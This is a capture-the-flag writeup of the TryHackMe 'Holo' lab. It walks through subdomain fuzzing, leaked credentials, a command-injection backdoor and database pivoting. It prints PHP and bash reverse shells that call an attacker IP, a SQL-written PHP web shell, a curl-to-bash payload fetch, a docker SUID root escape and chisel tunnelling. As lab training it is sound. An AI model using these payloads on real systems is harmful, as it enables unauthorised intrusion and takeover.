---
layout: post
title: Holo - TryHackMe
date: 2024-08-29
category: CTF
tags:
  - TryHackMe
  - Active Directory
  - Pivoting
platform: TryHackMe
cover_image: /assets/hololive_cover.png
post_type: writeup
---

# Holo - TryHackMe

**Description:** Writeup for the Holo Corporate network on TryHackMe — an Active Directory and Web-App attack lab covering web exploitation, pivoting, and lateral movement techniques.

> Holo is an Active Directory (AD) and Web-App attack lab that aims to teach core web attack vectors and more advanced AD attack techniques. This network simulates an external penetration test on a corporate network.

## Walkthrough

We start with the following scope of engagement: `10.200.x.0/24` and `192.168.100.0/24`. These represent two subnets within our target environment. The `/24` notation indicates that each subnet can contain 256 IP addresses, ranging from 0 to 255. Now, our first task is to identify the specific subnet within the `10.200.x.0/24` range, as the `x` in this case is unspecified and could vary. In order to determine the subnet of `10.200.x.0/24` , command `route` is used (confirming which interface the traffic is routed through).

![/img/image_holo.png](/assets/image_holo.png)

Scope is narrowed down to `10.200.107.0/24` and `192.168.100.0/24`.

```bash
└─$ sudo nmap -sn -n 10.200.107.0/24 192.168.100.0/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-29 09:39 CEST
Nmap scan report for 10.200.107.33

Host is up (0.081s latency).

Nmap scan report for 10.200.107.250

Host is up (0.074s latency).
```

For `102.168.100.0/24` we get the result that all hosts are up, which can indicate that firewalls/IDS/IPS are configured to respond to ICMP Echo Requests (pings) on behalf of all IP addresses in the network. This is sometimes done to obscure the actual network layout from unauthorized scanners. Therefore, we focus on `10.200.107.33` and `10.200.107.250` .

### Enumeration

We proceed to scan more aggressively  one by one, because from my understanding parallel scans could cause unreliable results, **because of the VPN connection that's needed, and could act as a limiting traffic-factor and can interfere with heavy parallel scanning**.

![/img/image_holo1.png](/assets/image_holo1.png)

![/img/image_holo2.png](/assets/image_holo2.png)

Attack surface isn't that much wide, so we focus on port 80, i.e. [`http://10.200.107.33`](http://10.200.107.33/).

![/img/image_holo3.png](/assets/image_holo3.png)

Site is not fully loaded, what usually indicates that our machine cannot resolve `holo.live`, so usually we proceed and edit `/etc/hosts` but before doing so, we can try fuzzing additional subdomains. Using tools like `ffuf`, `Gobuster`, or `dnsrecon`, we can identify additional subdomains by testing common or custom wordlists (I perfer using seclists).

```bash
└─$ wfuzz -u 10.200.107.33 -w /usr/share/wordlists/seclists/SecLists-master/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.holo.live" --hw 1402
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.200.107.33/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                            
=====================================================================

000000024:   200        75 L     158 W      1845 Ch     "admin"                                            
000000019:   200        271 L    701 W      7515 Ch     "dev"                                              
000000001:   200        271 L    701 W      7515 Ch     "www"                                              

Total time: 0
Processed Requests: 114441
Filtered Requests: 114438
Requests/sec.: 0
```

Now when few more are discovered, we proceed to add the following to `/etc/hosts`:
`10.200.107.33    admin.holo.live 10.200.107.33    dev.holo.live 10.200.107.33    www.holo.live`

We can load the website again:

![/img/image_holo4.png](/assets/image_holo4.png)

Taking a look at [`admin.holo.live`](http://admin.holo.live/) and `dev.holo.live` :

![/img/image_holo5.png](/assets/image_holo5.png)

![/img/image_holo6.png](/assets/image_holo6.png)

The next step would be to bust some directories for all of three domanis. This technique is used to discover hidden or non-public directories and files on a web server that might be useful for further exploitation or information gathering.

```bash
└─$ gobuster dir -u http://www.holo.live/ -k -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt        
===============================================================                                                     
Gobuster v3.6                                                                                                       
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)                                                       
===============================================================                                                     
[+] Url:                     http://www.holo.live/                                                                  
[+] Method:                  GET                                                                                    
[+] Threads:                 10                                                                                     
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                           
[+] Negative Status codes:   404                                                                                    
[+] User Agent:              gobuster/3.6                                                                           
[+] Timeout:                 10s                                                                                    
===============================================================                                                     
Starting gobuster in directory enumeration mode                                                                     
===============================================================                                                     
/img                  (Status: 301) [Size: 312] [--> http://www.holo.live/img/]                                     
/javascript           (Status: 301) [Size: 319] [--> http://www.holo.live/javascript/]                              
/themes               (Status: 301) [Size: 315] [--> http://www.holo.live/themes/]                                  
```

```bash
└─$ gobuster dir -u http://dev.holo.live/ -k -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.holo.live/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 312] [--> http://dev.holo.live/img/]
```

To do scans above I have used `gobuster` , but there are many tools do so depending on what level of depth we want (we could also try with `feroxbuster`). However it does not seem to show `robots.txt` available, which is indeed present, according to `nmap` scan.

For the `www.holo.live`:

![/img/image_holo7.png](/assets/image_holo7.png)

For the `admin.holo.live`:

![/img/image_holo8.png](/assets/image_holo8.png)

Let's see how could we utilize these leaked file names. The usual web attack we can perform is LFI (Local File Inclusion). In an LFI attack, the goal is to trick the web application into including and potentially executing files from the server's local file system. By manipulating parameters that reference files (such as through query strings or form data), we might be able to include sensitive files like `/etc/passwd`, configuration files, or even logs that contain sensitive information.

![/img/image_holo9.png](/assets/image_holo9.png)

![/img/image_holo10.png](/assets/image_holo10.png)

It seems like the file mentioned in `robots.txt` indeed exists, and after navigating to it, php script is being downlaoded with the following content:

```plaintext
I know you forget things, so I'm leaving this note for you:
admin:DBManagerLogin!
- gurag <3
```

After getting credentials, we try entering them on admin's dashboard:

![/img/image_holo11.png](/assets/image_holo11.png)

### Access granted!

Usually we would fuzz against this website, to see if any interesting additional directory pops up, but in this case, lets go for source code investigation

![/img/image_holo12.png](/assets/image_holo12.png)

There are about 300-400 lines of code, which isn't much to go through briefly, but in this case, odd `if statement` pops up. This allows us to execute arbitrary command with `cmd`, otherwise the normal website outlook is displayed. Lets try with test command `whoami`.

![/img/image_holo13.png](/assets/image_holo13.png)

Since we know that we have Apache server, the likelihood of PHP presence is high (web applications hosted on Apache servers frequently utilize PHP for dynamic content management). We also have evidence for that, because we are working on `dashboard.php` , what indicates that we can go to: [https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) , and use the PHP one liner in order to obtain the rev shell.

```sql
php -r '$sock=fsockopen("10.50.103.59",5555);exec("/bin/sh -i <&3 >&3 2>&3");'
```

I like to do that by using Burp Suite, but you can also encode it via: [https://www.urlencoder.org/](https://www.urlencoder.org/) and run it as parameter. This will encode all special characters into their URL-encoded equivalents (e.g., spaces become `%20`, `=` becomes `%3D`, etc.). This part is critical for command injections.

![/img/image_holo14.png](/assets/image_holo14.png)

We are able to catch a shell on our side, and prove that currently logged user is  `www-data`:

```plaintext
└─$ nc -nvlp 5555
listening on [any] 5555 ...
connect to [10.50.103.59] from (UNKNOWN) [10.200.107.33] 60388
/bin/sh: 0: can't access tty; job control turned off
$ dir
action_page.php  dashboard.php   docs      hololive.png  robots.txt
assets           db_connect.php  examples  index.php     supersecretdir
$ whoami
www-data
```

### Situational Awareness

In order to determine what is around in in the network, we can run the `arp -a`  command in order to see what interactions our machine had in recent history (whenever machine interacts with another device on the local network, it needs to know the corresponding MAC address for the device's IP address. This mapping is stored in the ARP cache), therefore this action isn't loud since it only lists cache info.

```plaintext
$ arp -a                                                                                                            
arp -a                                                                                                              
ip-192-168-100-1.eu-west-1.compute.internal (192.168.100.1) at 02:42:6f:60:5e:c4 [ether] on eth0
```

![/img/image_holo15.png](/assets/image_holo15.png)

This matches perfectly with the network topology that is laid out at the beginning.

![/img/image_holo16.png](/assets/image_holo16.png)

!!! note
    In order to look for the available ports, we have multiple options. Scripts such as full bash port scanner and also port scanner version in Python are always a good option, but a lot of times we are in restricted environment. Let's see how can we look for the ports using `netcat`:

```plaintext
$ nc -zv 192.168.100.1 1-65535                                                                                      
nc -zv 192.168.100.1 1-65535
ip-192-168-100-1.eu-west-1.compute.internal [192.168.100.1] 33060 (?) open
ip-192-168-100-1.eu-west-1.compute.internal [192.168.100.1] 8080 (http-alt) open
ip-192-168-100-1.eu-west-1.compute.internal [192.168.100.1] 3306 (mysql) open
ip-192-168-100-1.eu-west-1.compute.internal [192.168.100.1] 80 (http) open
ip-192-168-100-1.eu-west-1.compute.internal [192.168.100.1] 22 (ssh) open

```

### Gaining Access to Remote MYSQL Server

We have seen that we have `mysql` available on port 3306. We can take a look around if we can find any valid credentials related to database access. In `/var/www` we can find the following:

```plaintext
$ cat db_connect.php
cat db_connect.php
<?php

define('DB_SRV', '192.168.100.1');
define('DB_PASSWD', "!123SecureAdminDashboard321!");
define('DB_USER', 'admin');
define('DB_NAME', 'DashboardDB');

$connection = mysqli_connect(DB_SRV, DB_USER, DB_PASSWD, DB_NAME);

if($connection == false){

        die("Error: Connection to Database could not be made." . mysqli_connect_error());
}
?>
```

From here it is straightforward to try to connect to `mysql` server. Remember that we need to specify the host otherwise it will try connecting locally (on L-SRV02 instead of L-SRV01).

```sql
$ mysql -u admin -p -h 192.168.100.1
mysql -u admin -p -h 192.168.100.1
Enter password: !123SecureAdminDashboard321!

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 21
Server version: 8.0.25 MySQL Community Server - GPL

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| DashboardDB        |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.00 sec)

mysql> use DashboardDB;
use DashboardDB;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```

After quick enumeration we find the additional user:

```sql
mysql> select * from users;
select * from users;
+----------+-----------------+
| username | password        |
+----------+-----------------+
| admin    | DBManagerLogin! |
| gurag    | AAAA            |
+----------+-----------------+
2 rows in set (0.00 sec)
```

We then proceed to inject php code in our database, in order to escape the current environment(container) by using malicious `SELECT` command. This is a backdoor RCE on the server, that allows us to send commands via the `cmd` parameter.

```sql
select '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/shell.php';
```

We can easily prove whether it works by pointing to injected code:

```sql
curl 192.168.100.1:8080/shell.php?cmd=whoami
```

As pointed many time until this point, we can proceed to substitute `whoami` proof with a rev shell.

### Moving laterally to a New Linux Target L-SRV01

So, I have made a script locally which is transferred onto compromised docker using curl command.

```bash
└─$ cat shell.sh                                    
#!/bin/bash
bash -i >& /dev/tcp/10.50.103.59/53 0>&1
```

We have to host the server locally again, and then to perform the curl onto curl. To be more precise, we have to transfer the rev shell onto the server so we can create a backdoor. Simultaneously we are listening on port 53! (netcat or metasploit)

```bash
curl 'http://192.168.100.1:8080/shell.php?cmd=curl%20http%3A%2F%2F10.50.103.59%3A80%2Fshell.sh%7Cbash%20%26'
```

### Privilege Escalation

Yet again, we are dealing with a situation where we want to escalate our privileges or to move laterally. Since we can transfer the files onto our new machine, it is always a good option to look at the `linepeas` findings.

Before that we can look for quick wins, like ssh hunting, what could we execute using sudo and SUID bit permissions (command: `find / -perm -u=s -type f 2>/dev/null`). And it seems like we have a `docker` SUID bit set, what indicates that we can go to GTFO bins website and check the privileged access as a SUID backdoor.

![/img/image_holo17.png](/assets/image_holo17.png)

Reference: [https://gtfobins.github.io/gtfobins/docker/](https://gtfobins.github.io/gtfobins/docker/)

To find the docker images:

```bash
$ docker ps -a
docker ps -a
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                NAMES
451c4b8fb840        cb1b741122e8        "/bin/sh -c '/etc/in…"   2 hours ago         Up 2 hours          0.0.0.0:80->80/tcp   www-holo-live
```

Now, the original command is removing the `alpine` ("Dockerized" version of Alpine Linux), but in our case we want to remove the current image that is running therefore we execute:

```bash
$ /usr/bin/docker run -v /:/mnt --rm -it  cb1b741122e8 chroot /mnt sh
/usr/bin/docker run -v /:/mnt --rm -it  cb1b741122e8 chroot /mnt sh
 * Starting Apache httpd web server apache2                                      * 
 * Starting MySQL database server mysqld                                        No directory, logging in with HOME=/
                                                                         [ OK ]
root@581d1a69d1f2:/# whoami
whoami
root 
```

### Root!

The next thing is to gain persistence, stabilize shell, in order to move forward with pivoting. There are many ways of doing so, and most popular would be creating a SSH keypair and add our public key (it can be done with simple echo append). We should also opt for `/etc/shadow` permission, and if we can read that (stored hashed passwords for all user accounts on the system), then it is fairly easy to use `unshadow` and crack the plaintext password. The `unshadow` command combines information from both files into a single format that is easier to crack using tools like `John the Ripper` or `Hashcat`.

More info on: [https://juggernaut-sec.com/weak-file-permissions/](https://juggernaut-sec.com/weak-file-permissions/)

### Pivoting

We have discovered new machines, that we will try to pivot to. Those are `10.200.107.30` and `10.200.107.31` .

![/img/image_holo18.png](/assets/image_holo18.png)

We can transfer the `chisel` instance for Linux onto the compromised machine, and same as in Wreath network from TryHackMe, we go with reverse server on our attackbox and we connect with client.

Set up the server on our attacker machine:

```bash
└─$ /opt/chisel/chisel_lin server -p 8000 --reverse      
2024/08/29 19:17:36 server: Reverse tunnelling enabled
```

Transfer the `chisel` script onto target machine and run the client:

```bash
curl 10.50.103.59:90/chisel_lin -o /tmp/chisel_lin
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 8736k  100 8736k    0     0   946k      0  0:00:09  0:00:09 --:--:--  908k
```

```bash
./chisel_lin client 10.50.103.59:8000 R:socks &
[1] 664
root@581d1a69d1f2:/tmp# 2024/08/29 17:19:37 client: Connecting to ws://10.50.103.59:8000
2024/08/29 17:19:38 client: Connected (Latency 70.35071ms)
```

Once the connection is established we can ping the target machine (or view it browser utilizing foxyproxy):

![/img/image_holo19.png](/assets/image_holo19.png)

We run the nmap scan through `foxyproxy` to determine additional hosts on internal network:

```bash
└─$ proxychains nmap 10.200.107.0/24                                                                                                 
[proxychains] config file found: /etc/proxychains.conf                                                                               
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4                                                               
[proxychains] DLL init: proxychains-ng 4.17 
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.200.107.30:80  ...  OK
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.200.107.31:80  ...  OK
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.200.107.35:80  ...  OK
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
```

What we can additionally do, is to `nmap` every discovered port more aggressively.

So far, we have the following credentials, which we can try on the new website (identical look of login portal, as we had with initial `admin.holo.live` ).

```bash
└─$ cat creds.txt  
admin:DBManagerLogin!
gurag:!123SecureAdminDashboard321!
linux-admin:linuxrulez
```

For this step, according to the Task 28 we have to intercept the request with user token that is provided once we head onto the `Reset Password` option. **The specific part of the code that is vulnerable is when the `resettoken` is sent via JSON.**

![/img/image_holo20.png](/assets/image_holo20.png)

When heading back to the password reset website, we are prompted a new login screen for resetting password!

### What's next?

After logging in with credentials, there is a file upload option on the website. But here we face a "catch", since now we are facing EDR (**Endpoint Detection and Response**), and from here we have to dive into AV Evasion, what is taught later in this network section. However, in this writeup I haven't covered C2 usage, nor AV Evasion, since my main focus was to document pivoting and exploitation methodology. Nevertheless, I would suggest going through complete network, where you can learn about Active Directory attacks, such as NTLM Relay attacks.
